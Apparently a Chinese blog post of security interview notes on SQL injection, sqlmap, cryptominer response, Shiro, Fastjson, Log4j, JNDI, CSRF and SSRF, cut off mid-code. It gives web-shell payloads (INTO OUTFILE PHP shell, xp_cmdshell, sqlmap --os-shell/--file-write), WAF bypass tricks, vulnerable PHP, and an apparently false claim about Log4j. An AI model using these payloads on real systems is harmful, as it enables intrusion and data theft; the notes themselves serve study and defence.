注入漏洞的出现。</p><p><strong>1、sql注入延时函数sleep禁用怎么办：</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175502879.png" alt="image-20230731175502879"></p><p><strong>2、sql报错注入的函数有哪些：</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170738154.png" alt="image-20230731170738154"></p><p><strong>报错注入函数</strong></p><p>报错注入也被称为盲注入，是一种 SQL 注入技术。在报错注入中，攻击者试图向目标系统发送恶意的 SQL 查询并观察系统返回的错误消息，从而了解数据库中存储的敏感数据或执行其它攻击。</p><p>您提到的“报错注入函数” ，可能是指用于触发报错注入的 SQL 函数。以下是一些常见的用于报错注入的 SQL 函数：</p><ol><li>substring() 函数：该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>length() 函数：该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">SELECT LENGTH((SELECT username from users WHERE id=1));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>ASCII() 函数：该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>总之，报错注入是一种危险的攻击方式，可以导致泄漏敏感信息、执行未经授权的操作等安全问题。因此，开发人员必须采取适当的安全措施，例如对所有输入数据进行验证和过滤，不要直接拼接 SQL 语句，使用参数化查询等。同时，也应该定期测试应用程序以检测是否存在 SQL 注入漏洞。</p><p><strong>支持报错注入的数据库都有哪些</strong></p><p>报错注入是一种比较常见的 SQL 注入技术，不同的数据库在报错注入方面的支持程度不同。以下是一些主要的数据库和它们在报错注入方面的支持情况：</p><ol><li>MySQL：MySQL 是一个流行的开源关系型数据库管理系统，它对报错注入提供了很好的支持。</li><li>Microsoft SQL Server：Microsoft SQL Server 是微软开发的关系型数据库管理系统，它对报错注入也提供了很好的支持。</li><li>Oracle：Oracle 是一个功能强大的商业级数据库管理系统，它对报错注入的支持相对较差。</li><li>PostgreSQL：PostgreSQL 是一个开源的对象关系型数据库管理系统，它对报错注入的支持相对较好。</li><li>SQLite：SQLite 是一个嵌入式关系型数据库管理系统，它对报错注入的支持较弱。</li></ol><p>总之，在进行 SQL 注入测试时，我们需要针对目标数据库的特定版本和配置进行适当的测试，并注意不同数据库之间在报错注入方面的区别。同时，开发人员在编写应用程序时，应该采取适当的安全措施来防止 SQL 注入攻击。</p><p><strong>3、SQL 注入如何进行检测</strong></p><ol><li>数据库异常日志：在数据库服务器上查看异常日志或错误日志，如果发现异常 SQL 语句，或者 SQL 语句中包含可疑代码或关键字，就可能存在 SQL 注入攻击。</li><li>应用服务器日志：在应用服务器上查看访问日志或错误日志，如果发现访问异常、错误码增多，或者包含可疑的 URL 参数等信息，也可能表明存在 SQL 注入攻击。</li><li>漏洞扫描工具：使用专业的漏洞扫描工具，可以自动化地检测应用程序中可能存在的 SQL 注入漏洞，并提供修补建议。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li><li>手动测试：模拟攻击者的行为，手动输入特定的 SQL 语句或注入代码，来验证是否存在 SQL 注入漏洞。</li></ol><p>需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的 SQL 注入检测方法。在进行 SQL 注入检测时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。同时，如果确实发现了 SQL 注入攻击，应及时采取措施来修复漏洞并保护数据库中的数据。</p><p><strong>SQL注入常见的关键字：</strong></p><ol><li><code>UNION</code>：<code>UNION</code>操作符用于结合两个或更多的<code>SELECT</code>语句的结果集，并移除重复的数据。</li><li><code>OR</code> / <code>AND</code>：这些逻辑操作符可以用于创建更复杂的查询条件。</li><li><code>--</code>、<code>#</code>、<code>/*</code>：这些都是SQL注释符，可以用来结束原始SQL语句，从而使注入的SQL代码生效。</li><li><code>';</code>：这是SQL语句的结束符，也可以用来结束原始SQL语句，从而使注入的SQL代码生效。</li><li><code>'='</code>、<code>'LIKE'</code>：这些操作符可以用于创建查询条件。</li><li><code>' ' or 'x'='x'</code>：这是一个经典的SQL注入例子，如果应用程序没有对用户输入进行适当的处理，那么这个查询条件就会永远为真。</li></ol><p><strong>4、Sql 注入加固措施？</strong></p><p>为了防止 SQL 注入攻击，可以采取以下一些常见的加固措施：</p><ol><li>输入验证：对用户输入数据进行验证和过滤，特别是对单引号、双引号、分号等特殊字符进行处理。可以使用输入过滤函数或正则表达式等方式来实现。</li><li>参数化查询：使用参数化查询操作数据库，可以将用户输入的数据视为参数而不是 SQL 代码的一部分，从而避免 SQL 注入攻击。</li><li>最小化权限原则：在应用程序连接数据库时，给予最小必要的权限，并严格控制数据库访问权限，以减少攻击者利用 SQL 注入漏洞获取敏感信息的可能性。</li><li>安全编码标准：在开发应用程序时，遵循安全编码标准，避免使用拼接 SQL 语句的方式，而是采用参数化查询等安全方式来操作数据库。</li><li>异常信息处理：在应用程序中添加异常处理机制，可以及时捕获和记录 SQL 注入攻击产生的异常信息，便于管理员及时发现和修复问题。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li></ol><p>需要注意的是，以上只是其中一部分常见的 SQL 注入加固措施，针对不同的应用和场景，可能需要采用不同的加固措施。在进行 SQL 注入防御时，需要综合考虑多种因素，并不断更新和完善自身的防御措施，以提高安全水平并减少被攻击的风险。</p><p><strong>sql注入怎么修复</strong></p><p>修复SQL注入漏洞的主要方法之一是使用<strong>参数化查询</strong>。这种技术可以将用户输入作为参数传递给数据库查询，而不是将其拼接到查询字符串中。通过这种方式，应用程序可以避免恶意用户在输入中注入任何SQL代码。</p><p>另一个修复SQL注入漏洞的方法是<strong>对输入数据进行严格的验证和过滤</strong>。这需要开发人员仔细检查所有用户输入数据，并确保它们只包含有效的字符和格式。例如，如果一个输入字段只接受数字，则必须验证输入是否仅包含数字，并拒绝包含其他字符的输入。</p><p>最后，还可以使用安全的编程实践来保护应用程序免受SQL注入攻击。这包括限制应用程序的权限以及使用加密和身份验证等安全措施来保护数据库服务器和应用程序。</p><p>总之，修复SQL注入漏洞的关键是开发人员需要了解并理解如何处理用户输入，并采取必要的措施来确保输入数据的完整性和安全性。</p><p><strong>sql注入遇到waf，怎么绕过</strong></p><p>以下是几种常见的方法：</p><ol><li>使用编码：攻击者可以对注入负载进行编码，例如使用十六进制或Unicode编码等方式，以绕过<strong>WAF对字符集的检查</strong>。攻击者还可以使用<strong>字符串分割、大小写转换等技术手段，以使WAF无法识别恶意代码。</strong></li><li><strong>使用注入器：SQL注入攻击工具如Sqlmap、Havij、SQLi-hunter等，可以</strong>自动检测和利用各种SQL注入漏洞，并通过绕过WAF来获取敏感数据。</li><li>盲注：在盲注攻击中，攻击者不直接获取查询结果，而是根据应用程序的响应来判断是否存在漏洞。攻击者可以<strong>使用时间延迟或错误信息来判断是否存在漏洞，并以此来推断数据库中的数据。</strong></li><li>变形注入：变形注入攻击是一种多次执行的注入攻击，使用变体的注入负载，使注入负载不同于以前的攻击负载，从而逃避WAF的检测。</li></ol><pre class="line-numbers language-none"><code class="language-none">1，关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct2，通杀的，内联注释，如 /*!select*/3，编码，可两次编码4，multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF5，参数绕过，复制参数，id=1&amp;id=16，组合法 如 and 可以用&amp;&amp;再 URL 编码7、替换法，如 and 改成&amp;&amp;;=可以用 like 或 in 等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SQL 注入读写文件的根本条件</p><p>数据库允许导入导出（secure_file_priv）</p><p>当前用户用户文件操作权限（File_priv）</p><table><thead><tr><th>secure_file_prive  参数的设置</th><th>含义</th></tr></thead><tbody><tr><td>secure_file_prive=null</td><td>限制 mysqld 不允许导入导出</td></tr><tr><td>secure_file_priv=/tmp/</td><td>限制 mysqld 的导入导出只能发 生在 /tmp/ 目录下</td></tr><tr><td>secure_file_priv=’ ‘</td><td>不对 mysqld 的导入导出做限制</td></tr></tbody></table><p>secure_file_prive 直接在 my.ini 文件里设置即可</p><ul><li>load_file () 读文件</li></ul><p>into outfile /into dumpfile 写文件</p><p>条件： </p><ul><li>对 web 目录具有读写权限 </li><li>知道文件绝对路径 </li><li>能够使用联合查询（sql 注入时）</li></ul><p>outfile 与 dumpfile 的区别：</p><ul><li>dumpfile 适用于二进制文件，它会将目标文件 写入同一行内，outfile 则更适用于文本文件。</li></ul><p>命令：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">select load_file(‘d:/phpstudy/www/123.php’); select ‘123’ into outfile ‘d:/phpstudy/www/123.php’; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>7、sql注入如何写shell</strong></p><p><strong>root权限，网络路径：</strong></p><p>在SQL注入攻击中，如果攻击者成功地注入了一些恶意的SQL代码，则可以利用这些漏洞来执行各种操作，包括编写shell。以下是攻击者可能使用的几种技术：</p><ol><li>利用UNION SELECT语句：通过构造一个带有UNION SELECT语句的SQL查询，攻击者可以在结果集中插入一些命令，并通过这些命令来编写shell，例如在 <strong>MySQL</strong> 中可以使用 <strong>INTO OUTFILE</strong> 来将结果输出到文件中。</li></ol><p>例如，以下语句可以在MySQL中编写shell：</p><pre class="line-numbers language-none"><code class="language-none">http://example.com/products.php?id=1 UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;",2 INTO OUTFILE "/var/www/html/shell.php";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>利用<strong>LOAD_FILE</strong>函数：如果应用程序允许使用LOAD_FILE函数加载文件，攻击者可以使用该函数来读取并执行任意的本地shell脚本文件。</li></ol><p>例如，在MySQL中，攻击者可以使用以下代码来读取并执行一个本地shell脚本：</p><pre class="line-numbers language-none"><code class="language-none">http://example.com/products.php?id=-1' UNION SELECT LOAD_FILE('/path/to/malicious/script.sh'),'',''<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>利用指定数据库的存储过程：攻击者可以使用存储过程来创建和执行恶意的shell脚本，例如在Microsoft SQL Server中，可以使用以下代码来创建并执行一个命令解释器：</li></ol><pre class="line-numbers language-none"><code class="language-none">CREATE PROCEDURE sp_ExecCmd (@cmd varchar(1000))ASBEGINDECLARE @ret intEXEC @ret = master..xp_cmdshell @cmdENDGOEXEC sp_ExecCmd 'command'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击者利用SQL注入漏洞来执行命令或编写shell是非常危险的，因此，在编写应用程序时必须采用适当的安全措施，例如对所有输入数据进行严格的验证和过滤，并使用参数化查询来避免SQL注入攻击。</p><p><strong>8、sqlmap中risk和levels区别</strong></p><p>在SQL注入扫描器sqlmap中，-r 参数表示风险等级，-level 参数表示扫描等级。这两个参数的区别如下：</p><ol><li>风险等级（-r 或 –risk）：表示发现漏洞的可能性，取值范围是 1-3，越高表示发现漏洞的可能性越大。在较低的风险等级下，sqlmap只执行少量测试，而在更高的风险等级下，sqlmap会进行更多的测试。</li><li>扫描等级（-level 或 –level）：表示扫描深度和测试量，取值范围是 1-5，越高表示扫描深度越深、测试量越大。在较低的扫描等级下，sqlmap只执行一些基本的测试，而在更高的扫描等级下，sqlmap会执行更多的测试，并探测更多的漏洞类型。</li></ol><p>总之，在使用 sqlmap 进行 SQL 注入扫描时，我们需要根据情况调整风险等级和扫描等级，以达到最优的扫描效果。同时，还需要注意 sqlmap 执行测试过程中对目标系统造成的影响，避免对目标系统产生不必要的影响。</p><p><strong>sqlmap常用命令</strong></p><p>SQLMap是一种常用的自动化SQL注入攻击工具，可以对目标网站进行全自动的SQL注入漏洞扫描和利用。以下是一些SQLMap的常用命令：</p><ol><li>基本扫描命令：</li></ol><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --dbs &nbsp; &nbsp; &nbsp; # 获取所有可利用的数据库sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables  # 获取指定数据库中的所有表sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --columns &nbsp; # 获取指定表中的所有列sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename -C columnname --dump &nbsp;  # 获取指定列中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POST请求和Cookie：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/login.php" --data="username=admin&amp;password=1234" --cookie="PHPSESSID=abcd1234" --level=5 --risk=3   # 向登录页面发送POST请求和Cookie，并对网站进行深度扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>手动指定注入点：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --technique=T --random-agent --level=5 --risk=3 --current-db --users --passwords --privileges --threads=10 --batch --skip-waf --tamper=randomcomments -p id   # 指定注入点为id参数，绕过WAF设置，使用随机HTTP头和注入负载进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>高级命令：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --os-shell     # 获取操作系统Shellsqlmap -u "http://target.com/page.php?id=1" --os-pwn       # 获取操作系统级别的访问权限sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/config.php"  # 读取指定文件内容sqlmap -u "http://target.com/page.php?id=1" --file-write="/var/www/shell.php" --file-dest="/var/www/html/" --tamper="apostrophemask.py" --batch   # 向目标服务器写入Web Shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>sqlmap –os-shell 原理了解吗？</strong></p><p>sqlmap 的–os-shell 在 mysql 数据库中的原理，其实就是往服务器上写入了两个  php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页 url 中通过对 cmd 参数传参执行系统命令。</p><p><strong>SQL server  - CVE</strong> </p><p><strong>原理：</strong>当SQL Server错误地处理页面请求时,会触发一个远程代码执行漏洞。成功利用该漏洞的攻击者会在当前用户的上下文中运行任意代码,如果当前用户使用管理用户权限登录,那么攻击者就可以控制受影响的系统。</p><p>SQL Server Reporting Services**(SSRS)<strong>提供了一组本地工具和服务，用于创建、部署和管理移动报告和分页报告。</strong>SSRS** Web应用程序中的功能允许低特权用户帐户通过利用反序列化问题在服务器上运行代码。只有授权用户才能访问该应用程序，但是最低权限也可利用此漏洞。</p><p>获得低权限的攻击者向受影响版本的SQL Server的Reporting Services实例发送精心构造的请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码</p><p><strong>3.2 防护建议</strong></p><p>由于攻击者可通过对请求数据包编码绕过Web应用防火墙的防护，强烈建议用户安装补丁程序进行修复。禁止匿名访问，确保只有经过身份验证的用户才能访问相关应用；如果怀疑服务器已经受到威胁，除安装相应补丁外，请及时更改服务器的账户口令，防止被攻击者利用。</p><p><strong>SQL 查询异常流量分析思路</strong></p><p>1、数据库短时间内查询增多有可能遭遇到了【扫描】或者【sql 注入测试】，可以结合流量分析工具进行研判</p><p>2、【select】 和【union】为数据库查询语句特征，当这两者数量出现次数较多而且差异较小可能存在 SOL 注入漏洞或正在被扫描器扫描，可监控这两个关键字，但还需 要进一步查看具体请求参数。</p><p>如：                        </p><p>（1) 使用 wireshark 打开抓取后的流量包                        </p><p>（2) 对于抓取到的数据包筛选出 HTTP 协议包，在统计处筛选出短时间内流量较大的 IP </p><p>（3）尝试定位一些基本的注入特征（select、union、（）、/*、sleep 等）</p><h2 id="一、木马挖矿特征分析"><a href="#一、木马挖矿特征分析" class="headerlink" title="一、木马挖矿特征分析"></a>一、木马挖矿特征分析</h2><p>当服务器或PC处于什么样的状态时，我们可以判定为被挖矿。通常来说，当我们的服务器或PC资源(CPU)使用率接近或超过100%，并持续高居不下导致服务器或PC操作延缓，我们就可以判定被挖矿。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170128534.png" alt="image-20230731170128534"></p><p>看日志有没有异常的连接或者是网络端口</p><p>看是什么类型，木马的话就看他的可以的端口可疑的进程</p><p>看是什么引起的，能不能手动关掉，不能的话用工具什么的，清除掉再加固。</p><h3 id="一、Linux确认挖矿"><a href="#一、Linux确认挖矿" class="headerlink" title="一、Linux确认挖矿"></a><strong>一、Linux确认挖矿</strong></h3><p>a. 使用<code>top</code>命令查看系统性能，找出消耗资源较高的进程PID；</p><p>b. 根据获取的PID信息利用<code>ps -ef -p PID</code>命令找出系统进程详细信息；</p><p>c. 根据进程详细信息定位到文件位置，进入文件位置进行文件分析，确认是否属于挖矿程序。</p><p>d.crontab查看计划任务</p><p>netstat查看端口</p><p>停止服务：<code>systemctl stop *.service</code>；</p><ul><li>杀掉进程：<code>kill 9 PID</code>，很多时候不光杀掉一个进程；</li><li>删除文件：<code>rm -fr abnormal_file</code>，删除文件时可以使用<code>find / -name abnormal_file</code>查找出系统中所有的恶意文件；</li><li>清理定时任务：<code>crontab -e</code>；</li></ul><h3 id="一、Windows确认挖矿"><a href="#一、Windows确认挖矿" class="headerlink" title="一、Windows确认挖矿"></a><strong>一、Windows确认挖矿</strong></h3><ul><li><p>使用图形化界面分析确认</p><p>a. 打开<code>任务管理器</code>：<code>Ctrl + Alt + Delete</code> 快捷键 或者 <code>win + r</code> 快捷键，输入 <code>taskmgr</code>；</p><p>b. 在<code>任务管理器</code>中找到<code>资源管理器</code>；</p><p>c. 通过<code>资源管理器</code>找到占用CPU资源较高的服务或进程，获取其PID信息；</p><p>d. 利用获取的PID信息在<code>任务管理器</code>中的<code>详细信息</code>一栏中找到对应的程序，右键<code>打开文件位置</code>，获取异常文件目录；</p><p>e. 进入到异常文件目录中，对文件进行分析，确认是否属于挖矿程序；</p><p>f. 确认挖矿程序后，先对挖矿程序进行备份。然后先关闭对应的服务与进程，再删除对应的定时任务，最后删除对应的文件。在删除文件之后，反向再查询一遍定时任务、进程与服务，最好是在间隔一定时间段后再复查一次</p><p>应急响应流程：</p></li></ul><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170501965.png" alt="image-20230731170501965"></p><h2 id="一、java漏洞："><a href="#一、java漏洞：" class="headerlink" title="一、java漏洞："></a>一、java漏洞：</h2><p>shiro，fastjson之类的，常问这俩。</p><h3 id="一、shiro"><a href="#一、shiro" class="headerlink" title="一、shiro"></a>一、shiro</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170615823.png" alt="image-20230731170615823"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173919178.png" alt="image-20230731173919178"></p><p><strong>平常怎么去发现 Shiro 漏洞的？</strong></p><p>Apache Shiro 是一个 Java 安全框架，执行身份验证、授权、密码和会话管理。apacheShiro 框架提供了记住我（RememberMe）的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。</p><p>shiro 反序列化漏洞：shiro 在 CookieRememberMeManaer 类中将 cookie 中<strong>rememberMe  字段内容分别进行序列化、AES 加密、Base64 编码操作</strong>。攻击者构造一个恶意的对象，并且<strong>对其序列化，AES 加密，base64 编码后，作为 cookie 的 rememberMe 字段发送。Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</strong></p><p>登陆失败时候会返回 rememberMe=deleteMe 字段或者使用 shiroScan 被动扫描去发现</p><p>完整：</p><p>未登陆的情况下，请求包的 cookie 中没有 rememberMe 字段，返回包 set-Cookie 里也没有 deleteMe 字段</p><p>登陆失败的话，不管勾选 RememberMe 字段没有，返回包都会有 rememberMe=deleteMe 字段</p><p>不勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段。但是之后的所有请求中 Cookie 都不会有 rememberMe 字段</p><p>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段</p><p><strong>shiro 有几种漏洞类型</strong></p><p>shiro 550</p><p>shiro 721</p><p>Apache Shiro 框架提供了记住我的功能（RemeberMe），用户登录成功后会生成经过加密并编码的 cookie。cookie 的 key 为  RemeberMe，cookie 的值是经过对相关信息进行序列化，然后使用 aes 加密，最后在使用 base64 编码处理形成的</p><p>在服务端接收 cookie 值时，按以下步骤解析：</p><blockquote><p>检索 RemeberMe cookie 的值</p><p>Base 64 解码</p><p>使用 ACE 解密（加密密钥硬编码）</p><p>进行反序列化操作（未作过滤处理）</p></blockquote><p>在调用反序列化的时候未进行任何过滤，导致可以触发远程代码执行漏洞</p><p>用户登陆成功后会生成经过加密并编码的  cookie，在服务端接收 cookie 值后，Base64 解码 –&gt;AES 解密 –&gt; 反序列化。攻击者只要找到 AES  加密的密钥，就可以构造一个恶意对象，对其进行序列化 –&gt;AES 加密 –&gt;Base64 编码，然后将其作为 cookie 的  rememberMe 字段发送，Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</p><p><strong>shiro550和721的区别</strong></p><p>加密位数不一样</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731171017047.png" alt="image-20230731171017047"></p><h3 id="一、Fastjson-漏洞"><a href="#一、Fastjson-漏洞" class="headerlink" title="一、Fastjson 漏洞"></a>一、Fastjson 漏洞</h3><p>利用：配合JNDI注入</p><p><strong>原理：</strong></p><p>在请求包里面中发送恶意的 json 格式 payload，漏洞在处理 json 对象的时候，没有对 @type 字段进行过滤，从而导致攻击者可以传入恶意的  TemplatesImpl 类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes 生成 java  实例，这就达到 fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数。</p><p>FastJson 是一个由阿里巴巴研发的 java 库，可以把 java 对象转换为 JSON 格式，也可以把 JSON 字符串转换为对象。</p><p>通俗理解就是：漏洞利用 fastjson autotype 在处理 json 对象的时候，未对 @type 字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程 rmi 主机，通过其中的恶意类执行代码。</p><p>攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响。</p><p>Fastjson RCE 的本质就是在反序列化时会调用目标类的 setter 方法。以 com.sun.rowset.JdbcRowSetImpl Gadget 为例，类中的 setAutoCommit 方法中通过 connect 方法调用了 lookup 方法，且 lookup 方法的参数又能通过  setDataSourceName 方法设置，即其参数可控。那么就会导致 JNDI 注入，最终实现任意命令执行。</p><p>Java 处理 Json 格式数据有三个比较流行的类库：</p><ul><li>Gson (google 维护) </li><li>Jackson</li><li>Fastjson</li></ul><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170624443.png" alt="image-20230731170624443"></p><h3 id="二、log4j"><a href="#二、log4j" class="headerlink" title="二、log4j"></a>二、log4j</h3><p><strong>payload关键字：jndi</strong></p><p><strong>原理：</strong></p><p>Apache Log4j2 是一个基于 Java 的日志记录工具。Apache Log4j 2.x &lt;= <strong>2.14.1</strong> 版本存在远程代码执行漏洞。  漏洞的主要原因是 log4j2  的<strong>接收器对于不可靠来源的输入没有过滤</strong>，攻击者则可以利用此特性通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。由于 Log4j2  组件在处理程序日志记录时存在 JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向服务器发送恶意的数据，触发 log4j2  组件的缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p><p>为了输出日志时能够方便地输出任意位置的 java 对象，Log4j2 引入了一个叫 <strong>Lookup  的统一接口</strong>。这个接口<strong>允许</strong>在写日志的时候，按照<strong>具体的实现逻辑</strong>去查找对象的位置，并输出对象的内容。这里的对象通常在内存中，但由于 java  支持对象的序列化 / 反序列化，它也可以存储在硬盘文件里，甚至是远程服务器上。</p><p>我们提到的 <strong>JNDI 就是对 Lookup  接口的一种实现</strong>。其本身也是一个接口，提供了命名关键字到对象的<strong>映射目录</strong>，允许开发者提供一个名称，即可获取到对象的内容。LDAP，即<strong>轻量级目录访问协议</strong>，是 JNDI 的一种底层实现，它可以让我们方便的<strong>查询分布式数据库</strong>。既然是分布式的，LDAP  <strong>允许从远程服务器加载对象</strong>。而这里加载对象时使用的不是一般的<strong>反序列化方法</strong>，而是通过<strong>「命名引用」功能</strong>，<strong>支持直接从远程下载 class  文件并加载对象</strong>。</p><p>于是，Log4j2 中就暗含了注入漏洞：<strong>允许传入参数解析为 LDAP 协议，从远程服务器下载 class 文件并执行</strong>。这个功能本来是为了方便开发，使 java 对象位置对上层应用透明，却不料酿成大祸</p><p>Log4j依赖于Apache Commons Math库中的一个子模块，即Math Expression Parser（MEP）库，以解析日志消息中的数学表达式。这个库使用了JNDI（Java命名和目录接口）技术，<strong>JNDI允许开发人员将Java对象绑定到命名空间中，以供其他Java应用程序使用</strong>。</p><p>攻击者可以通过构造特制的请求，将恶意的JNDI名称注入到Log4j中，从而诱骗Log4j调用该JNDI名称代表的对象，例如远程服务器上的恶意Java类。当Log4j尝试解析JNDI名称时，它会触发恶意JNDI资源的加载，并在其中执行恶意代码。</p><p>攻击者可以利用此漏洞来执行各种攻击，包括但不限于：</p><ol><li>远程代码执行：攻击者可以利用此漏洞在目标系统上执行任意代码，可能导致机密信息泄露、数据损坏和系统崩溃等问题。</li><li>远程命令执行：攻击者可以利用此漏洞在目标系统上执行任意命令，例如下载和安装恶意软件、创建后门访问等。</li></ol><p><strong>设备上出现log4j，怎么判断攻击成功？</strong></p><p>如果在设备上出现了log4j，则说明攻击者可能利用Log4j漏洞进行攻击，此时可以通过以下方式判断是否真的发生了攻击：</p><ol><li>检查服务器日志：如果攻击成功，一般会在服务器日志中留下明显的痕迹，如未经授权的文件访问、操作系统命令执行等。建议定期检查服务器日志，尤其是涉及敏感数据和关键操作的日志。</li><li>检查网络流量：攻击者在远程操纵受害设备时，一般需要与设备进行网络通信，因此可以通过检查网络流量来判断<strong>是否有异常的数据传输行为</strong>。建议采用<strong>网络监控工具</strong>对网络流量进行实时监控，并对异常流量进行警报和记录。</li><li>检查系统进程：攻击者在利用漏洞进行攻击时，可能需要启动或修改一些系统进程，因此可以通过检查系统进程列表来寻找<strong>异常行为</strong>。建议使用系统<strong>监控工具</strong>对系统进程进行实时监控，并对异常进程进行警报和记录。</li></ol><p>需要注意的是，出现了Log4j并不意味着攻击一定已经成功，也可能只是正常业务应用中使用了Log4j功能。因此，在判断是否受到攻击时，应该综合考虑多种因素，并采取相应的安全措施。</p><h2 id="三、JNDI-注入"><a href="#三、JNDI-注入" class="headerlink" title="三、JNDI 注入"></a>三、JNDI 注入</h2><p>JNDI RCE 漏洞产生的原因就在于当我们在注册 RMI 服务时，可以指定 Codebase url，也就是远程要加载类的位置，设 置该属性可以让 JDNI 应用程序在加载时去寻找我们指定的类 ( 例如：<a href="http://ip:port/EvilObject.class">http://ip:port/EvilObject.class</a>) 。 </p><p>这里还有一个比较重要的点，也是触发恶意代码的点。就是当 JNDI 应用程序通过 lookup (RMI 服务的地址) 方法调用指 定 Codebase url  上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时， 漏洞就会触发。</p><h2 id="一、CSRF漏洞"><a href="#一、CSRF漏洞" class="headerlink" title="一、CSRF漏洞"></a>一、<strong>CSRF</strong>漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802110425758.png" alt="image-20230802110425758"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802110531643.png" alt="image-20230802110531643"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802110837789.png" alt="image-20230802110837789"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802111014210.png" alt="image-20230802111014210"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802111259860.png" alt="image-20230802111259860"></p><p>php中有<strong>CSP</strong>，java应该应该也有类似的，开启后没法进行外站应用</p><p>通常出现在数据处理的地方，账户登录，转账，修改信息</p><h2 id="一、SSRF"><a href="#一、SSRF" class="headerlink" title="一、SSRF"></a>一、SSRF</h2><p><strong>漏洞成因</strong></p><p>1.服务端提供了从其他服务器应用获取数据的功能</p><p>2.没有对目标地址做过滤与限制</p><p>比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载文件等等</p><ul><li><p>漏洞产生与危害</p><p>在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数</p><p>file_get_contents()</p><pre class="line-numbers language-none"><code class="language-none">//file_get_contents是把文件写入字符串，当把url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取&lt;?phpif(isset($_POST['url'])){    $content=file_get_contents($_POST['url']);    $filename='./images/'.rand().'.img';\    file_put_contents($filename,$content);    echo $_POST['url'];    $img="&lt;img src=\"".$filename."\"/&gt;";}echo 